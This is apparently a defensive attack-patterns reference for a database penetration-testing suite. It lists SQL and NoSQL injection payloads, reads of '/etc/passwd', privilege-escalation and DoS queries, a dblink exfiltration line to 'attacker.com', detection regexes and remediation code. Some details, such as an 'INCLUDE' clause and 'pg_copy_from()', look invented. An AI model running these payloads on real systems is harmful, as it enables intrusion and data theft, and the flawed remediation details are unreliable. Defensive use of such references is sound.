# Attack Patterns Reference

**Version**: 1.0
**Last Updated**: 2026-02-09

This document provides a comprehensive reference of all attack patterns tested in the penetration testing suite, including payloads, detection methods, and remediation strategies.

---

## Table of Contents

1. [SQL Injection Patterns](#sql-injection-patterns)
2. [Privilege Escalation Patterns](#privilege-escalation-patterns)
3. [Authentication Bypass Patterns](#authentication-bypass-patterns)
4. [Denial of Service Patterns](#denial-of-service-patterns)
5. [Data Exfiltration Patterns](#data-exfiltration-patterns)
6. [Detection Signatures](#detection-signatures)
7. [Remediation Strategies](#remediation-strategies)

---

## SQL Injection Patterns

### Classic SQL Injection

#### Pattern 1: Tautology Attack
**Payload**: `' OR '1'='1`
**Goal**: Bypass authentication by making WHERE clause always true
**Example**:
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '...'
```
**Detection**: Look for boolean operators in input strings
**Prevention**: Parameterized queries

#### Pattern 2: Union Select Extraction
**Payload**: `' UNION SELECT * FROM learning_queue --`
**Goal**: Extract data from other tables
**Example**:
```sql
SELECT proposed_content FROM learning_queue WHERE id = '1' UNION SELECT * FROM users --'
```
**Detection**: Detect UNION keyword and multiple SELECT statements
**Prevention**: Input validation, parameterized queries

#### Pattern 3: Batch Statement Injection
**Payload**: `'; INSERT INTO learning_queue ... --`
**Goal**: Inject additional SQL statements
**Example**:
```sql
INSERT INTO learning_queue (proposed_content) VALUES ('test'); INSERT INTO users (username) VALUES ('hacker') --')
```
**Detection**: Detect semicolon separators
**Prevention**: Disallow multiple statements, use prepared statements

#### Pattern 4: Comment-Based Injection
**Payload**: `' OR 1=1 --`
**Goal**: Bypass remaining query logic using SQL comments
**Example**:
```sql
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'secret'
```
**Detection**: Detect SQL comment markers (--, /**/, #)
**Prevention**: Sanitize input, remove comments

#### Pattern 5: Time-Based Blind Injection
**Payload**: `'; WAITFOR DELAY '00:00:10' --`
**Goal**: Infer vulnerability via response time
**Example**:
```sql
SELECT * FROM learning_queue WHERE id = '1'; WAITFOR DELAY '00:00:10' --'
```
**Detection**: Monitor query execution times
**Prevention**: Query timeouts, input validation

### Advanced SQL Injection

#### Pattern 6: Second-Order Injection
**Payload**: `admin'/*`
**Goal**: Store malicious payload for later execution
**Example**:
```sql
-- Stored in database
INSERT INTO users (username) VALUES ('admin'/*')

-- Later executed in different context
SELECT * FROM users WHERE username = 'admin'/*' AND status = 'active'
```
**Detection**: Context-aware validation
**Prevention**: Sanitize all input, even on read

#### Pattern 7: Boolean Blind Injection
**Payload**: `' AND 1=1 --`
**Goal**: Infer data by asking true/false questions
**Example**:
```sql
SELECT * FROM learning_queue WHERE id = '1' AND 1=1 --'  -- Returns true
SELECT * FROM learning_queue WHERE id = '1' AND 1=2 --'  -- Returns false
```
**Detection**: Monitor for repeated queries with boolean variations
**Prevention**: Normalize response times, limit query complexity

#### Pattern 8: Error-Based Injection
**Payload**: `' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables)) --`
**Goal**: Trigger errors that leak database information
**Example**:
```sql
SELECT * FROM learning_queue WHERE id = '1' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables)) --'
```
**Detection**: Sanitize error messages, monitor for frequent errors
**Prevention**: Generic error messages, input validation

#### Pattern 9: Stored Procedure Injection
**Payload**: `'; EXEC xp_cmdshell 'dir' --`
**Goal**: Execute system commands via stored procedures
**Example**:
```sql
EXEC sp_executesql N'SELECT * FROM learning_queue WHERE id = ''1''; EXEC xp_cmdshell ''dir'' --'''
```
**Detection**: Restrict stored procedure execution
**Prevention**: Least privilege database roles, disable dangerous procedures

#### Pattern 10: Hex Encoding Evasion
**Payload**: `0x274F522027313D2731` (hex for `' OR '1'='1`)
**Goal**: Bypass input filters using hex encoding
**Example**:
```sql
SELECT * FROM learning_queue WHERE id = CONVERT(VARCHAR, 0x274F522027313D2731)
```
**Detection**: Decode all input before validation
**Prevention**: Multi-layer validation, decode before sanitize

### NoSQL/JSON Injection

#### Pattern 11: NoSQL Operator Injection
**Payload**: `{ $ne: null }`
**Goal**: Bypass authentication in NoSQL databases
**Example**:
```javascript
db.users.find({ username: { $ne: null }, password: { $ne: null } })
```
**Detection**: Validate JSON structure, detect NoSQL operators
**Prevention**: Schema validation, operator allowlisting

#### Pattern 12: BSON Regex Injection
**Payload**: `{ $regex: ".*" }`
**Goal**: Match all documents using regex
**Example**:
```javascript
db.users.find({ username: { $regex: ".*" } })
```
**Detection**: Detect regex operators, limit complexity
**Prevention**: Regex allowlisting, timeout protection

#### Pattern 13: JavaScript Where Clause
**Payload**: `{ $where: "this.rating == 5" }`
**Goal**: Execute JavaScript in database query
**Example**:
```javascript
db.products.find({ $where: "this.price < 100" })
```
**Detection**: Block $where operator entirely
**Prevention**: Disable JavaScript execution, use strict query syntax

#### Pattern 14: Prototype Pollution
**Payload**: `{ __proto__: { admin: true } }`
**Goal**: Modify object prototype to gain privileges
**Example**:
```javascript
const user = JSON.parse('{ "__proto__": { "admin": true } }');
user.isAdmin; // true (polluted prototype)
```
**Detection**: Validate JSON keys, detect __proto__
**Prevention**: Object.freeze(Object.prototype), use Object.create(null)

#### Pattern 15: JSON Schema Bypass
**Payload**: `{ rating: { $gt: 0 } }`
**Goal**: Bypass schema validation using operators
**Example**:
```javascript
// Schema expects: { rating: number }
// Attacker sends: { rating: { $gt: 0 } }
```
**Detection**: Deep schema validation, type checking
**Prevention**: Strict schema validation, disallow objects in primitive fields

### File-Based Attacks

#### Pattern 16: Path Traversal
**Payload**: `'../../../etc/passwd'`
**Goal**: Read files outside web root
**Example**:
```sql
SELECT * FROM files WHERE path = '../../../etc/passwd'
```
**Detection**: Detect .. in paths, validate file paths
**Prevention**: Allowlist file locations, use canonical paths

#### Pattern 17: File Include Injection
**Payload**: `' INCLUDE '/etc/passwd' --`
**Goal**: Include arbitrary files in query execution
**Example**:
```sql
SELECT * FROM files WHERE id = '1' INCLUDE '/etc/passwd' --'
```
**Detection**: Block INCLUDE commands
**Prevention**: Disable file inclusion, strict path validation

#### Pattern 18: Command Injection
**Payload**: `'; cat /etc/passwd #`
**Goal**: Execute shell commands
**Example**:
```bash
# In a vulnerable application
id="'; cat /etc/passwd #"
mysql -u user -p "SELECT * FROM users WHERE id='$id'"
```
**Detection**: Detect shell metacharacters (;, |, &, #, $, etc.)
**Prevention**: Never pass user input to shell, use APIs instead

#### Pattern 19: Template Injection
**Payload**: `{{config}}`
**Goal**: Access server-side template variables
**Example**:
```python
# Jinja2 template
template = "Hello {{ user_input }}"
render(template, user_input="{{config}}")
```
**Detection**: Sandbox template execution, validate input
**Prevention**: Use secure template engines, disable dangerous features

#### Pattern 20: Log Injection
**Payload**: `'\nADMIN: true`
**Goal**: Inject fake log entries
**Example**:
```javascript
console.log(`User login: ${userInput}`);
// Input: "admin\n[INFO] Admin login successful"
// Log shows fake admin login
```
**Detection**: Sanitize log input, detect newlines
**Prevention**: Encode newlines, structured logging

---

## Privilege Escalation Patterns

### Role Manipulation

#### Pattern 1: SET ROLE Escalation
**SQL**: `SET ROLE app_admin;`
**Goal**: Change from low-privilege to admin role
**Detection**: Monitor role changes, audit SET ROLE commands
**Prevention**: Restrict SET ROLE to superusers only

#### Pattern 2: SET SESSION AUTHORIZATION
**SQL**: `SET SESSION AUTHORIZATION postgres;`
**Goal**: Impersonate superuser
**Detection**: Audit session authorization changes
**Prevention**: Block SET SESSION AUTHORIZATION for non-superusers

#### Pattern 3: CREATE ROLE Injection
**SQL**: `CREATE ROLE hacker_role WITH SUPERUSER;`
**Goal**: Create new privileged role
**Detection**: Audit DDL commands
**Prevention**: Restrict CREATE ROLE to admins

#### Pattern 4: ALTER ROLE RENAME
**SQL**: `ALTER ROLE app_admin RENAME TO app_admin_old;`
**Goal**: Rename existing roles to cause confusion
**Detection**: Audit ALTER ROLE commands
**Prevention**: Restrict ALTER ROLE to admins

#### Pattern 5: DROP ROLE Attack
**SQL**: `DROP ROLE app_admin;`
**Goal**: Remove admin role to cause DoS
**Detection**: Audit DROP commands
**Prevention**: Restrict DROP to admins, require confirmation

### Permission Bypass

#### Pattern 6: GRANT Self Permissions
**SQL**: `GRANT ALL PRIVILEGES ON ALL TABLES TO app_writer;`
**Goal**: Grant elevated permissions to self
**Detection**: Audit GRANT commands
**Prevention**: Restrict GRANT to admins

#### Pattern 7: REVOKE Admin Permissions
**SQL**: `REVOKE ALL ON learning_queue FROM app_admin;`
**Goal**: Remove admin permissions
**Detection**: Audit REVOKE commands
**Prevention**: Restrict REVOKE to admins

#### Pattern 8: CREATE TABLE Escalation
**SQL**: `CREATE TABLE hacker_table (id SERIAL);`
**Goal**: Create objects with elevated privileges
**Detection**: Audit CREATE commands
**Prevention**: Restrict CREATE to admins

#### Pattern 9: ALTER TABLE Structure
**SQL**: `ALTER TABLE learning_queue ADD COLUMN backdoor TEXT;`
**Goal**: Modify table schema
**Detection**: Audit ALTER commands
**Prevention**: Restrict ALTER to admins

#### Pattern 10: TRUNCATE TABLE DoS
**SQL**: `TRUNCATE TABLE learning_queue;`
**Goal**: Delete all data (DoS)
**Detection**: Audit TRUNCATE commands
**Prevention**: Restrict TRUNCATE to admins, require confirmation

### Data Access Violation

#### Pattern 11: Cross-Tenant Access
**SQL**: `SELECT * FROM learning_queue WHERE shop_id = 2;` (as shop_id=1 user)
**Goal**: Access data from other tenants
**Detection**: Row-Level Security (RLS), audit cross-tenant queries
**Prevention**: Implement RLS on all multi-tenant tables

#### Pattern 12: Function Security Definer Bypass
**SQL**: `SELECT * FROM get_all_data();` (function runs with definer rights)
**Goal**: Use SECURITY DEFINER function to bypass restrictions
**Detection**: Audit SECURITY DEFINER functions
**Prevention**: Review all definer functions, use least privilege

#### Pattern 13: Information Schema Access
**SQL**: `SELECT table_name FROM information_schema.tables;`
**Goal**: Enumerate database structure
**Detection**: Audit information_schema access
**Prevention**: Restrict information_schema access

#### Pattern 14: pg_class Direct Access
**SQL**: `SELECT relname FROM pg_class WHERE relkind = 'r';`
**Goal**: Access system catalogs directly
**Detection**: Audit pg_catalog access
**Prevention**: Restrict system catalog access

#### Pattern 15: View Definition Extraction
**SQL**: `SELECT viewname, definition FROM pg_views;`
**Goal**: Extract view definitions
**Detection**: Audit view definition access
**Prevention**: Restrict pg_views access

---

## Authentication Bypass Patterns

### Authentication Weakness

#### Pattern 1: Empty Password
**Payload**: `{ user: 'admin', password: '' }`
**Goal**: Authenticate with empty password
**Detection**: Validate password length > 0
**Prevention**: Require non-empty passwords

#### Pattern 2: Null Password
**Payload**: `{ user: 'admin', password: null }`
**Detection**: Check for null/undefined
**Prevention**: Type validation, null checks

#### Pattern 3: SQL Injection in Username
**Payload**: `{ user: "' OR '1'='1", password: "pass" }`
**Detection**: Input sanitization, parameterized queries
**Prevention**: Never concatenate input in SQL

#### Pattern 4: Brute Force
**Attack**: 100 rapid login attempts
**Detection**: Rate limiting, account lockout
**Prevention**: Implement progressive delays, CAPTCHA

#### Pattern 5: Connection Flood
**Attack**: 1000 simultaneous connections
**Detection**: Monitor concurrent connections
**Prevention**: Connection limits, IP-based throttling

### Session Hijacking

#### Pattern 6: Weak Session Token
**Payload**: `{ token: 'token-123' }`
**Detection**: Use cryptographically secure tokens
**Prevention**: Generate tokens with sufficient entropy (128+ bits)

#### Pattern 7: Session Fixation
**Attack**: Set session ID before authentication
**Detection**: Regenerate session on authentication
**Prevention**: Always create new session on login

#### Pattern 8: Token Manipulation
**Payload**: `{ token: 'admin-token-123' }`
**Detection**: Validate token signatures
**Prevention**: Sign all tokens with HMAC

#### Pattern 9: Expired Session Reuse
**Attack**: Reuse expired session token
**Detection**: Check token expiration
**Prevention**: Implement session timeout

#### Pattern 10: Session Forgery
**Attack**: Forge session token without signature
**Detection**: Verify token signatures
**Prevention**: Use HMAC or digital signatures

---

## Denial of Service Patterns

### Resource Exhaustion

#### Pattern 1: Massive Text Insertion
**Payload**: 100MB string
**Detection**: Input size limits
**Prevention**: Max payload size (10MB recommended)

#### Pattern 2: Deep Recursion
**SQL**: `WITH RECURSIVE t AS (SELECT 1 UNION ALL SELECT t+1 FROM t) SELECT * FROM t LIMIT 1000000;`
**Detection**: Recursion depth limits
**Prevention**: Statement timeout, max recursion

#### Pattern 3: Cartesian Product
**SQL**: `SELECT * FROM t1, t2, t3;`
**Detection**: Query complexity analysis
**Prevention**: Query timeout, restrict multi-table joins

#### Pattern 4: Lock Starvation
**Attack**: Hold exclusive locks indefinitely
**Detection**: Lock timeouts
**Prevention**: Configure lock_timeout

#### Pattern 5: Long-Running Transaction
**SQL**: `SELECT pg_sleep(1000);`
**Detection**: Statement timeout
**Prevention**: Set statement_timeout (30s recommended)

### Computational Abuse

#### Pattern 6: Regex DoS (ReDoS)
**Payload**: Complex regex with catastrophic backtracking
**Detection**: Regex complexity limits
**Prevention**: Timeout regex evaluation, validate patterns

#### Pattern 7: JSON Bomb
**Payload**: Deeply nested JSON (20+ levels)
**Detection**: JSON depth limits
**Prevention**: Max depth (10 recommended), size limits

#### Pattern 8: Expensive Sorting
**SQL**: `ORDER BY col1, col2, col3, col4, col5 DESC;`
**Detection**: Query timeout
**Prevention**: Limit sort columns, use indexes

#### Pattern 9: Hash Collision
**Payload**: Data designed to cause hash collisions
**Detection**: Monitor query performance
**Prevention**: Use robust hash functions

#### Pattern 10: Memory Exhaustion
**Attack**: 100 concurrent 1MB requests
**Detection**: Memory limits
**Prevention**: work_mem limit, connection pooling

---

## Data Exfiltration Patterns

### Direct Data Access

#### Pattern 1: Table Enumeration
**SQL**: `SELECT table_name FROM information_schema.tables;`
**Detection**: Audit schema access
**Prevention**: Restrict information_schema

#### Pattern 2: Sensitive Table Access
**SQL**: `SELECT * FROM audit_logs;`
**Detection**: Table-level access controls
**Prevention**: Separate schemas for sensitive data

#### Pattern 3: Cross-Tenant Access
**SQL**: `SELECT * FROM data WHERE shop_id = 2;` (as shop_id=1 user)
**Detection**: Row-Level Security (RLS)
**Prevention**: Implement RLS policies

#### Pattern 4: Error Message Extraction
**SQL**: Trigger verbose errors
**Detection**: Sanitize error messages
**Prevention**: Generic error messages

#### Pattern 5: UNION Password Extraction
**SQL**: `SELECT field FROM table1 UNION SELECT password FROM pg_shadow;`
**Detection**: Block UNION with sensitive tables
**Prevention**: Restrict UNION, column-level security

### Side Channel Attacks

#### Pattern 6: Timing-Based Exfiltration
**Attack**: Infer data from query timing
**Detection**: Normalize query times, add random delays
**Prevention**: Constant-time operations

#### Pattern 7: Out-of-Band (OOB) Exfiltration
**SQL**: `SELECT * FROM dblink('attacker.com', 'SELECT data');`
**Detection**: Block outbound connections
**Prevention**: Disable dblink, network egress filtering

#### Pattern 8: DNS Exfiltration
**Attack**: Encode data in DNS queries
**Detection**: Monitor DNS queries
**Prevention**: DNS filtering, egress monitoring

#### Pattern 9: HTTP Header Leakage
**Attack**: Extract data from response headers
**Detection**: Review all headers
**Prevention**: Remove debug headers in production

#### Pattern 10: Response Size Analysis
**Attack**: Infer data from response size
**Detection**: Normalize response sizes
**Prevention**: Add padding, constant-size responses

---

## Detection Signatures

### SQL Injection Signatures

```regex
# String delimiters
('|(")|;|--|\/\*|\*\/)

# SQL keywords
\b(UNION|SELECT|INSERT|UPDATE|DELETE|DROP|ALTER|CREATE|EXEC|EXECUTE)\b

# Boolean bypass
(\bOR\b|\bAND\b).*=.*=

# Tautology
1=1|1 = 1|true|TRUE

# NoSQL operators
\$\$|\{|\}|<

# Path traversal
\.\.
```

### Privilege Escalation Signatures

```sql
-- Role changes
SET ROLE|SET SESSION AUTHORIZATION

-- DDL commands
CREATE (ROLE|TABLE|FUNCTION)|ALTER (ROLE|TABLE)|DROP (ROLE|TABLE)

-- Privilege modification
GRANT|REVOKE

-- System catalog access
information_schema|pg_catalog|pg_class|pg_views
```

### DoS Signatures

```sql
-- Long-running
pg_sleep|WAITFOR DELAY

-- Recursion
WITH RECURSIVE

-- Cartesian product
SELECT .* FROM .* , .* ,

-- Large input
length > 10485760  -- 10MB
```

### Data Exfiltration Signatures

```sql
-- Schema enumeration
information_schema|pg_catalog

-- Cross-tenant
shop_id != current_shop_id

-- UNION attacks
UNION SELECT

-- Outbound connections
dblink|copy to program
```

---

## Remediation Strategies

### SQL Injection Prevention

1. **Parameterized Queries** (Primary Defense)
   ```typescript
   // ❌ Vulnerable
   const query = `SELECT * FROM users WHERE id = '${userId}'`;

   // ✅ Secure
   const query = 'SELECT * FROM users WHERE id = $1';
   await client.query(query, [userId]);
   ```

2. **Input Validation**
   ```typescript
   function validateInput(input: string): boolean {
     // Allowlist approach
     const allowedChars = /^[a-zA-Z0-9\s\-_.@]+$/;
     return allowedChars.test(input) && input.length <= 1000;
   }
   ```

3. **Least Privilege Database Roles**
   ```sql
   -- Application user has minimal permissions
   GRANT SELECT, INSERT, UPDATE ON learning_queue TO app_user;
   -- No DROP, ALTER, CREATE permissions
   ```

### Privilege Escalation Prevention

1. **Row-Level Security (RLS)**
   ```sql
   ALTER TABLE learning_queue ENABLE ROW LEVEL SECURITY;

   CREATE POLICY shop_isolation ON learning_queue
     FOR ALL
     USING (shop_id = current_setting('app.current_shop_id')::INTEGER);
   ```

2. **Role-Based Access Control (RBAC)**
   ```sql
   -- Create roles with specific permissions
   CREATE ROLE app_reader;
   GRANT SELECT ON ALL TABLES IN SCHEMA public TO app_reader;

   CREATE ROLE app_writer;
   GRANT SELECT, INSERT, UPDATE ON ALL TABLES IN SCHEMA public TO app_writer;
   ```

3. **Function Security**
   ```sql
   -- Use SECURITY DEFINER sparingly
   CREATE OR REPLACE FUNCTION secure_function()
   RETURNS TABLE(...)
   SECURITY DEFINER
   SET search_path = public
   AS $$ ... $$;
   ```

### Authentication Hardening

1. **Rate Limiting**
   ```typescript
   const rateLimiter = new Map<string, number[]>();

   function checkRateLimit(ip: string): boolean {
     const now = Date.now();
     const attempts = rateLimiter.get(ip) || [];
     const recentAttempts = attempts.filter(t => now - t < 60000);  // 1 minute

     if (recentAttempts.length >= 5) {
       return false;  // Rate limited
     }

     recentAttempts.push(now);
     rateLimiter.set(ip, recentAttempts);
     return true;
   }
   ```

2. **Secure Session Tokens**
   ```typescript
   import crypto from 'crypto';

   function generateSessionToken(): string {
     return crypto.randomBytes(32).toString('base64');
   }

   function signToken(token: string): string {
     const hmac = crypto.createHmac('sha256', SECRET_KEY);
     hmac.update(token);
     return `${token}.${hmac.digest('base64')}`;
   }
   ```

3. **Password Validation**
   ```typescript
   function validatePassword(password: string): boolean {
     // Min 12 chars, uppercase, lowercase, number, special
     const regex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{12,}$/;
     return regex.test(password);
   }
   ```

### DoS Mitigation

1. **Statement Timeout**
   ```sql
   -- In postgresql.conf
   statement_timeout = 30000  -- 30 seconds
   ```

2. **Connection Limits**
   ```sql
   -- In postgresql.conf
   max_connections = 100
   ```

3. **Input Size Limits**
   ```typescript
   const MAX_PAYLOAD_SIZE = 10 * 1024 * 1024;  // 10MB

   function validatePayloadSize(data: any): boolean {
     return JSON.stringify(data).length <= MAX_PAYLOAD_SIZE;
   }
   ```

### Data Exfiltration Prevention

1. **Row-Level Security**
   ```sql
   CREATE POLICY tenant_isolation ON learning_queue
     FOR SELECT
     USING (shop_id = current_setting('app.current_shop_id')::INTEGER);
   ```

2. **Error Message Sanitization**
   ```typescript
   function sanitizeError(error: Error): string {
     // Don't expose internal details
     return 'An error occurred. Please try again later.';
   }
   ```

3. **Disable Dangerous Functions**
   ```sql
   -- Block outbound connections
   REVOKE ALL ON FUNCTION dblink() FROM PUBLIC;

   -- Disable copy to program
   REVOKE ALL ON FUNCTION pg_copy_from() FROM PUBLIC;
   ```

---

**Version**: 1.0
**Last Updated**: 2026-02-09
**Maintainer**: Security Auditor Agent

*This document is for defensive security purposes only. Always obtain proper authorization before testing any attack patterns.*
